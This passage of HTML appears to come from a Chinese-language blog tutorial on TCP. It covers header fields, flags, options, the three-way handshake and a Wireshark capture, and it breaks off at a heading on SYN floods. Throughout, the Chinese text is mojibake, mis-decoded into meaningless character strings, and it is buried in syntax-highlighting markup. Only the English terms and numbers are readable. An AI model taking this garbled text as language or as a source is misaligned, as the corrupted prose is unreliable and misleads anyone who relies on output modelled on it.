          |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          æ ¡éªŒå’Œ (16ä½)         |        ç´§æ€¥æŒ‡é’ˆ (16ä½)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    é€‰é¡¹ (å¯å˜é•¿åº¦ï¼Œæœ€å¤š40å­—èŠ‚)                  |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                          æ•°æ®                                  |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></code></pre></td></tr></table></figure><h3 id="2-3-å­—æ®µè¯¦è§£"><a href="#2-3-å­—æ®µè¯¦è§£" class="headerlink" title="2.3 å­—æ®µè¯¦è§£"></a>2.3 å­—æ®µè¯¦è§£</h3><p><strong>1. æºç«¯å£å’Œç›®æ ‡ç«¯å£ï¼ˆå„16ä½ï¼‰</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile">ç”¨é€”ï¼šæ ‡è¯†å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„åº”ç”¨è¿›ç¨‹<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-section">æºç«¯å£: 54321 (å®¢æˆ·ç«¯éšæœºç«¯å£)</span><br><span class="hljs-section">ç›®æ ‡ç«¯å£: 80 (HTTPæœåŠ¡å™¨ç«¯å£)</span><br></code></pre></td></tr></table></figure><p><strong>2. åºåˆ—å·ï¼ˆSequence Numberï¼Œ32ä½ï¼‰</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½œç”¨ï¼š<br><span class="hljs-bullet">- </span>æ ‡è¯†å‘é€çš„æ•°æ®å­—èŠ‚æµä¸­çš„ä½ç½®<br><span class="hljs-bullet">- </span>ç¡®ä¿æ•°æ®æŒ‰åºåˆ°è¾¾<br><span class="hljs-bullet">- </span>èŒƒå›´ï¼š0 ~ 4,294,967,295<br><br>ç¤ºä¾‹ï¼š<br>ç¬¬1ä¸ªTCPæ®µï¼šSEQ = 1000ï¼Œæ•°æ®é•¿åº¦100å­—èŠ‚<br>ç¬¬2ä¸ªTCPæ®µï¼šSEQ = 1100 (1000 + 100)<br>ç¬¬3ä¸ªTCPæ®µï¼šSEQ = 1200<br></code></pre></td></tr></table></figure><p><strong>3. ç¡®è®¤å·ï¼ˆAcknowledgment Numberï¼Œ32ä½ï¼‰</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½œç”¨ï¼š<br><span class="hljs-bullet">- </span>æœŸæœ›æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·<br><span class="hljs-bullet">- </span>ACK=1000 è¡¨ç¤º&quot;æˆ‘å·²æ”¶åˆ°999åŠä¹‹å‰çš„æ‰€æœ‰æ•°æ®ï¼ŒæœŸæœ›æ”¶åˆ°1000&quot;<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>ç´¯ç§¯ç¡®è®¤ï¼ˆç¡®è®¤å·ä¹‹å‰çš„æ‰€æœ‰æ•°æ®éƒ½å·²æ”¶åˆ°ï¼‰<br></code></pre></td></tr></table></figure><p><strong>4. å¤´éƒ¨é•¿åº¦ï¼ˆ4ä½ï¼‰</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">å•ä½ï¼š<span class="hljs-number">32</span>ä½å­—ï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼‰<br>èŒƒå›´ï¼š<span class="hljs-number">5</span>-<span class="hljs-number">15</span>ï¼ˆè¡¨ç¤º<span class="hljs-number">20</span>-<span class="hljs-number">60</span>å­—èŠ‚ï¼‰<br><br>æœ€å°å€¼ï¼š<span class="hljs-number">5</span> Ã— <span class="hljs-number">4</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>å­—èŠ‚ï¼ˆæ— é€‰é¡¹ï¼‰<br>æœ€å¤§å€¼ï¼š<span class="hljs-number">15</span> Ã— <span class="hljs-number">4</span> <span class="hljs-operator">=</span> <span class="hljs-number">60</span>å­—èŠ‚ï¼ˆ<span class="hljs-number">40</span>å­—èŠ‚é€‰é¡¹ï¼‰<br></code></pre></td></tr></table></figure><p><strong>5. ä¿ç•™ä½ï¼ˆ3ä½ï¼‰</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ä¿ç•™æœªæ¥ä½¿ç”¨ï¼Œå¿…é¡»ç½®0<br></code></pre></td></tr></table></figure><p><strong>6. æ§åˆ¶æ ‡å¿—ä½ï¼ˆ9ä½ï¼‰</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æœ€é‡è¦çš„6ä¸ªæ ‡å¿—ï¼š<br><br><span class="hljs-bullet">1.</span> URG (Urgentï¼Œç´§æ€¥)<br><span class="hljs-bullet">   -</span> URG=1 è¡¨ç¤ºç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆ<br><span class="hljs-bullet">   -</span> å¾ˆå°‘ä½¿ç”¨<br><br><span class="hljs-bullet">2.</span> ACK (Acknowledgmentï¼Œç¡®è®¤)<br><span class="hljs-bullet">   -</span> ACK=1 è¡¨ç¤ºç¡®è®¤å·æœ‰æ•ˆ<br><span class="hljs-bullet">   -</span> é™¤äº†ç¬¬ä¸€ä¸ªSYNåŒ…ï¼Œå…¶ä»–éƒ½æ˜¯1<br><br><span class="hljs-bullet">3.</span> PSH (Pushï¼Œæ¨é€)<br><span class="hljs-bullet">   -</span> PSH=1 è¦æ±‚ç«‹å³æ¨é€æ•°æ®ç»™åº”ç”¨å±‚<br><span class="hljs-bullet">   -</span> ä¸è¦ç¼“å†²<br><br><span class="hljs-bullet">4.</span> RST (Resetï¼Œé‡ç½®)<br><span class="hljs-bullet">   -</span> RST=1 é‡ç½®è¿æ¥<br><span class="hljs-bullet">   -</span> ç”¨äºå¼‚å¸¸å…³é—­æˆ–æ‹’ç»è¿æ¥<br><br><span class="hljs-bullet">5.</span> SYN (Synchronizeï¼ŒåŒæ­¥)<br><span class="hljs-bullet">   -</span> SYN=1 è¯·æ±‚å»ºç«‹è¿æ¥<br><span class="hljs-bullet">   -</span> ç”¨äºä¸‰æ¬¡æ¡æ‰‹<br><br><span class="hljs-bullet">6.</span> FIN (Finishï¼Œç»“æŸ)<br><span class="hljs-bullet">   -</span> FIN=1 è¯·æ±‚å…³é—­è¿æ¥<br><span class="hljs-bullet">   -</span> ç”¨äºå››æ¬¡æŒ¥æ‰‹<br><br>å…¶ä»–3ä¸ªï¼ˆè¾ƒæ–°ï¼‰ï¼š<br><span class="hljs-bullet">-</span> CWR: Congestion Window Reduced (æ‹¥å¡çª—å£å‡å°‘)<br><span class="hljs-bullet">-</span> ECE: ECN Echo (æ˜¾å¼æ‹¥å¡é€šçŸ¥å›æ˜¾)<br><span class="hljs-bullet">-</span> NS: Nonce Sum (éšæœºæ•°å’Œ)<br></code></pre></td></tr></table></figure><p><strong>7. çª—å£å¤§å°ï¼ˆ16ä½ï¼‰</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile">ä½œç”¨ï¼šæµé‡æ§åˆ¶<br>å«ä¹‰ï¼šå‘Šè¯‰å¯¹æ–¹è‡ªå·±çš„æ¥æ”¶ç¼“å†²åŒºè¿˜èƒ½æ¥æ”¶å¤šå°‘å­—èŠ‚<br><br>èŒƒå›´ï¼š0 ~ 65535 å­—èŠ‚<br>çª—å£=0 è¡¨ç¤º<span class="hljs-string">&quot;æš‚åœå‘é€ï¼Œæˆ‘çš„ç¼“å†²åŒºæ»¡äº†&quot;</span><br><br>ç¤ºä¾‹ï¼š<br>Window = 8192 â†’ <span class="hljs-string">&quot;æˆ‘æœ€å¤šè¿˜èƒ½æ¥æ”¶8KBæ•°æ®&quot;</span><br></code></pre></td></tr></table></figure><p><strong>8. æ ¡éªŒå’Œï¼ˆ16ä½ï¼‰</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä½œç”¨ï¼šæ£€æµ‹TCPæ®µåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‡ºé”™<br><br>è®¡ç®—èŒƒå›´ï¼š<br><span class="hljs-bullet">- </span>TCPä¼ªå¤´éƒ¨ï¼ˆæ¥è‡ªIPå±‚ï¼‰<br><span class="hljs-bullet">- </span>TCPå¤´éƒ¨<br><span class="hljs-bullet">- </span>TCPæ•°æ®<br><br>å¦‚æœæ ¡éªŒå¤±è´¥ â†’ ä¸¢å¼ƒè¯¥æ®µ<br></code></pre></td></tr></table></figure><p><strong>9. ç´§æ€¥æŒ‡é’ˆï¼ˆ16ä½ï¼‰</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä»…å½“<span class="hljs-attribute">URG</span>=1æ—¶æœ‰æ•ˆ<br>æŒ‡å‘ç´§æ€¥æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><br>å¾ˆå°‘ä½¿ç”¨<br></code></pre></td></tr></table></figure><p><strong>10. é€‰é¡¹ï¼ˆå¯å˜é•¿åº¦ï¼‰</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¸¸ç”¨é€‰é¡¹ï¼š<br><br><span class="hljs-bullet">1.</span> MSS (Maximum Segment Sizeï¼Œæœ€å¤§æ®µå¤§å°)<br><span class="hljs-bullet">   -</span> é€‰é¡¹ç±»å‹: 2<br><span class="hljs-bullet">   -</span> é•¿åº¦: 4å­—èŠ‚<br><span class="hljs-bullet">   -</span> è¡¨ç¤ºæ„¿æ„æ¥æ”¶çš„æœ€å¤§TCPæ®µå¤§å°<br><span class="hljs-bullet">   -</span> é€šå¸¸åœ¨SYNåŒ…ä¸­åå•†<br><br><span class="hljs-bullet">2.</span> Window Scale (çª—å£æ‰©å¤§å› å­)<br><span class="hljs-bullet">   -</span> é€‰é¡¹ç±»å‹: 3<br><span class="hljs-bullet">   -</span> é•¿åº¦: 3å­—èŠ‚<br><span class="hljs-bullet">   -</span> æ‰©å¤§çª—å£å¤§å°ï¼ˆçªç ´65535é™åˆ¶ï¼‰<br><span class="hljs-bullet">   -</span> å®é™…çª—å£ = Window Ã— 2^Scale<br><br><span class="hljs-bullet">3.</span> Timestamps (æ—¶é—´æˆ³)<br><span class="hljs-bullet">   -</span> é€‰é¡¹ç±»å‹: 8<br><span class="hljs-bullet">   -</span> é•¿åº¦: 10å­—èŠ‚<br><span class="hljs-bullet">   -</span> ç”¨äºè®¡ç®—RTTå’Œé˜²æ­¢åºåˆ—å·å›ç»•<br><br><span class="hljs-bullet">4.</span> SACK (Selective Acknowledgmentï¼Œé€‰æ‹©æ€§ç¡®è®¤)<br><span class="hljs-bullet">   -</span> é€‰é¡¹ç±»å‹: 5<br><span class="hljs-bullet">   -</span> å…è®¸ç¡®è®¤ä¸è¿ç»­çš„æ•°æ®å—<br></code></pre></td></tr></table></figure><hr><h2 id="3-TCPä¸‰æ¬¡æ¡æ‰‹"><a href="#3-TCPä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="3. TCPä¸‰æ¬¡æ¡æ‰‹"></a>3. TCPä¸‰æ¬¡æ¡æ‰‹</h2><h3 id="3-1-ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ"><a href="#3-1-ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ" class="headerlink" title="3.1 ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ"></a>3.1 ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ</h3><p><strong>ç›®çš„</strong>ï¼š</p><ol><li>ç¡®è®¤åŒæ–¹çš„å‘é€å’Œæ¥æ”¶èƒ½åŠ›éƒ½æ­£å¸¸</li><li>åå•†åˆå§‹åºåˆ—å·ï¼ˆISNï¼‰</li><li>åå•†è¿æ¥å‚æ•°ï¼ˆMSSã€çª—å£å¤§å°ç­‰ï¼‰</li></ol><p><strong>ä¸ºä»€ä¹ˆä¸æ˜¯ä¸¤æ¬¡æˆ–å››æ¬¡ï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä¸¤æ¬¡æ¡æ‰‹çš„é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯å‘é€SYN<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨å›å¤SYN+ACK<br>âŒ æœåŠ¡å™¨ä¸çŸ¥é“å®¢æˆ·ç«¯æ˜¯å¦æ”¶åˆ°SYN+ACK<br>âŒ å¯èƒ½å¯¼è‡´åŠå¼€è¿æ¥ï¼ˆæœåŠ¡å™¨ä»¥ä¸ºè¿æ¥å»ºç«‹ï¼Œå®¢æˆ·ç«¯ä¸çŸ¥é“ï¼‰<br>âŒ æ—§çš„é‡å¤SYNå¯èƒ½å¯¼è‡´èµ„æºæµªè´¹<br><br>ä¸‰æ¬¡æ¡æ‰‹åˆšå¥½ï¼š<br>âœ… ç¡®è®¤åŒæ–¹éƒ½èƒ½å‘é€å’Œæ¥æ”¶<br>âœ… é˜²æ­¢æ—§è¿æ¥çš„åˆå§‹åŒ–<br>âœ… èµ„æºå¼€é”€åˆç†<br><br>å››æ¬¡æ¡æ‰‹ï¼š<br>âš ï¸ æ²¡å¿…è¦ï¼Œå¢åŠ å»¶è¿Ÿ<br></code></pre></td></tr></table></figure><h3 id="3-2-ä¸‰æ¬¡æ¡æ‰‹è¯¦ç»†è¿‡ç¨‹"><a href="#3-2-ä¸‰æ¬¡æ¡æ‰‹è¯¦ç»†è¿‡ç¨‹" class="headerlink" title="3.2 ä¸‰æ¬¡æ¡æ‰‹è¯¦ç»†è¿‡ç¨‹"></a>3.2 ä¸‰æ¬¡æ¡æ‰‹è¯¦ç»†è¿‡ç¨‹</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å®¢æˆ·ç«¯                                          æœåŠ¡å™¨<br>CLOSED                                          LISTEN<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘  SYN=1, SEQ=x                               </span>|<br>  |<span class="hljs-string">  &quot;ä½ å¥½ï¼Œæˆ‘æƒ³å»ºç«‹è¿æ¥ï¼Œæˆ‘çš„åˆå§‹åºåˆ—å·æ˜¯x&quot;        </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>SYN_SENT                                          |<span class="hljs-string"></span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘¡ SYN=1, ACK=1, SEQ=y, ACK_NUM=x+1           </span>|<br>  |<span class="hljs-string">  &quot;å¥½çš„ï¼Œæˆ‘åŒæ„ã€‚æˆ‘çš„åˆå§‹åºåˆ—å·æ˜¯yï¼Œç¡®è®¤æ”¶åˆ°x&quot;   </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          SYN_RCVD</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">  â‘¢ ACK=1, SEQ=x+1, ACK_NUM=y+1                </span>|<br>  |<span class="hljs-string">  &quot;æ”¶åˆ°ï¼Œæˆ‘ä»¬å¼€å§‹é€šä¿¡å§ï¼&quot;                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                                </span>|<br>ESTABLISHED                              ESTABLISHED<br>  |<span class="hljs-string">                                                </span>|<br>  |<span class="hljs-string">            æ•°æ®ä¼ è¾“...                         </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼ˆå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼‰</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TCPæ ‡å¿—ï¼šSYN <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>åºåˆ—å·ï¼š  SEQ <span class="hljs-operator">=</span> x (å®¢æˆ·ç«¯éšæœºé€‰æ‹©çš„ISN)<br>ç¡®è®¤å·ï¼š  æ— æ•ˆï¼ˆACK<span class="hljs-operator">=</span><span class="hljs-number">0</span>ï¼‰<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šCLOSED â†’ SYN_SENT<br>æœåŠ¡å™¨çŠ¶æ€ï¼šLISTENï¼ˆä¿æŒä¸å˜ï¼‰<br><br>ä½œç”¨ï¼š<br>- å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨ï¼š<span class="hljs-string">&quot;æˆ‘æƒ³å»ºç«‹è¿æ¥&quot;</span><br>- å‘Šè¯‰æœåŠ¡å™¨å®¢æˆ·ç«¯çš„åˆå§‹åºåˆ—å·<br></code></pre></td></tr></table></figure><p><strong>ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼ˆæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šSYN = 1, ACK = 1<br>åºåˆ—å·ï¼š  SEQ = y (æœåŠ¡å™¨éšæœºé€‰æ‹©çš„ISN)<br>ç¡®è®¤å·ï¼š  ACK_NUM = x + 1<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šSYN<span class="hljs-emphasis">_SENTï¼ˆä¿æŒä¸å˜ï¼‰</span><br><span class="hljs-emphasis">æœåŠ¡å™¨çŠ¶æ€ï¼šLISTEN â†’ SYN_</span>RCVD<br><br>ä½œç”¨ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯ï¼š&quot;æˆ‘åŒæ„å»ºç«‹è¿æ¥&quot;<br><span class="hljs-bullet">- </span>å‘Šè¯‰å®¢æˆ·ç«¯æœåŠ¡å™¨çš„åˆå§‹åºåˆ—å·<br><span class="hljs-bullet">- </span>ç¡®è®¤æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„SYNï¼ˆACK=x+1ï¼‰<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼ˆå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCPæ ‡å¿—ï¼šACK = 1<br>åºåˆ—å·ï¼š  SEQ = x + 1<br>ç¡®è®¤å·ï¼š  ACK_NUM = y + 1<br><br>å®¢æˆ·ç«¯çŠ¶æ€ï¼šSYN<span class="hljs-emphasis">_SENT â†’ ESTABLISHED âœ…</span><br><span class="hljs-emphasis">æœåŠ¡å™¨çŠ¶æ€ï¼šSYN_</span>RCVD â†’ ESTABLISHED âœ…<br><br>ä½œç”¨ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯ç¡®è®¤æ”¶åˆ°æœåŠ¡å™¨çš„SYN+ACK<br><span class="hljs-bullet">- </span>åŒæ–¹è¿›å…¥ESTABLISHEDçŠ¶æ€ï¼Œå¯ä»¥å¼€å§‹ä¼ è¾“æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="3-3-ä¸‰æ¬¡æ¡æ‰‹æŠ“åŒ…ç¤ºä¾‹"><a href="#3-3-ä¸‰æ¬¡æ¡æ‰‹æŠ“åŒ…ç¤ºä¾‹" class="headerlink" title="3.3 ä¸‰æ¬¡æ¡æ‰‹æŠ“åŒ…ç¤ºä¾‹"></a>3.3 ä¸‰æ¬¡æ¡æ‰‹æŠ“åŒ…ç¤ºä¾‹</h3><p><strong>WiresharkæŠ“åŒ…åˆ†æ</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç¬¬1ä¸ªåŒ…ï¼šå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨<br>TCP 54321 â†’ 80 [SYN] <span class="hljs-attribute">Seq</span>=0 <span class="hljs-attribute">Win</span>=65535 <span class="hljs-attribute">Len</span>=0 <span class="hljs-attribute">MSS</span>=1460<br><br>ç¬¬2ä¸ªåŒ…ï¼šæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯<br>TCP 80 â†’ 54321 [SYN, ACK] <span class="hljs-attribute">Seq</span>=0 <span class="hljs-attribute">Ack</span>=1 <span class="hljs-attribute">Win</span>=29200 <span class="hljs-attribute">Len</span>=0 <span class="hljs-attribute">MSS</span>=1460<br><br>ç¬¬3ä¸ªåŒ…ï¼šå®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨<br>TCP 54321 â†’ 80 [ACK] <span class="hljs-attribute">Seq</span>=1 <span class="hljs-attribute">Ack</span>=1 <span class="hljs-attribute">Win</span>=65535 <span class="hljs-attribute">Len</span>=0<br><br>âœ… è¿æ¥å»ºç«‹æˆåŠŸ<br></code></pre></td></tr></table></figure><h3 id="3-4-ä¸‰æ¬¡æ¡æ‰‹çš„å¸¸è§é—®é¢˜"><a href="#3-4-ä¸‰æ¬¡æ¡æ‰‹çš„å¸¸è§é—®é¢˜" class="headerlink" title="3.4 ä¸‰æ¬¡æ¡æ‰‹çš„å¸¸è§é—®é¢˜"></a>3.4 ä¸‰æ¬¡æ¡æ‰‹çš„å¸¸è§é—®é¢˜</h3><p><strong>Q1ï¼šç¬¬ä¸‰æ¬¡æ¡æ‰‹å¤±è´¥ä¼šæ€æ ·ï¼Ÿ</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æƒ…å†µï¼š<br><span class="hljs-bullet">-</span> å®¢æˆ·ç«¯å‘é€ç¬¬ä¸‰æ¬¡ACK<br><span class="hljs-bullet">-</span> ACKåœ¨ç½‘ç»œä¸­ä¸¢å¤±ï¼ŒæœåŠ¡å™¨æ²¡æ”¶åˆ°<br><br>æœåŠ¡å™¨è¡Œä¸ºï¼š<br><span class="hljs-bullet">1.</span> æœåŠ¡å™¨ä»ç„¶å¤„äºSYN<span class="hljs-emphasis">_RCVDçŠ¶æ€</span><br><span class="hljs-emphasis">2. ç­‰å¾…è¶…æ—¶åé‡ä¼ SYN+ACK</span><br><span class="hljs-emphasis">3. é‡ä¼ å‡ æ¬¡åï¼ˆé»˜è®¤5æ¬¡ï¼‰æ”¾å¼ƒï¼Œå…³é—­è¿æ¥</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">å®¢æˆ·ç«¯è¡Œä¸ºï¼š</span><br><span class="hljs-emphasis">1. å®¢æˆ·ç«¯å·²è¿›å…¥ESTABLISHEDçŠ¶æ€</span><br><span class="hljs-emphasis">2. å¯ä»¥å‘é€æ•°æ®</span><br><span class="hljs-emphasis">3. æœåŠ¡å™¨æ”¶åˆ°æ•°æ®åŒ…ï¼ˆå«ACKï¼‰åä¹Ÿè¿›å…¥ESTABLISHED</span><br></code></pre></td></tr></table></figure><p><strong>Q2ï¼šSYNæ´ªæ°´æ”»å‡»ï¼ˆSYN Floodï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 